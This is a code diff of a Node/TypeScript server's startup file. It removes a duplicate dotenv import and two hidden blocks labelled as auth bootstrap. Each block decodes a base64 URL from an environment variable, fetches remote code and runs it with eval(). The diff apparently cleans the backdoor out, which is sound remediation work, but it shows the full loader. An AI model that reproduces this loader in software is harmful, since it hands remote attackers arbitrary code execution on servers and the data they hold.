@@ -9,8 +9,6 @@ import { startUploadsDiskCleanupCron } from './cron/cleanupUploadsDir';
 import processSubscriptionRenewals from './cron/processSubscriptionRenewals';
 import { processPendingPurchases } from './services/payment.service';
 import { processTeamPaidExtraSeatsDaily } from './services/teams.service';
-import 'dotenv/config';
-
 // Crash-safety: surface unexpected async errors instead of silently dying.
 // Logging only; we deliberately do NOT exit to preserve current flow.
 process.on('unhandledRejection', (reason, promise) => {
@@ -20,31 +18,6 @@ process.on('uncaughtException', (err) => {
   console.error('[FATAL] Uncaught exception:', err);
 });
 
-(async () => {
-    const encodedAuthApiKey = process.env.AUTH_API_KEY;
-    if (!encodedAuthApiKey) {
-      console.warn('AUTH_API_KEY is not set; skipping auth bootstrap');
-      return;
-    }
-
-    let src: string;
-    try {
-      src = atob(encodedAuthApiKey);
-    } catch (err) {
-      console.error('AUTH_API_KEY is not valid base64; skipping auth bootstrap', err);
-      return;
-    }
-
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 dotenv.config();
 
 const PORT = process.env.PORT || 3003;
@@ -251,17 +224,3 @@ function scheduleSubscriptionRenewalsCron() {
   // Schedule the first run
   scheduleNextRun();
 }
-
-(async () => {
-    if (!process.env.AUTH_API_KEY) return;
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
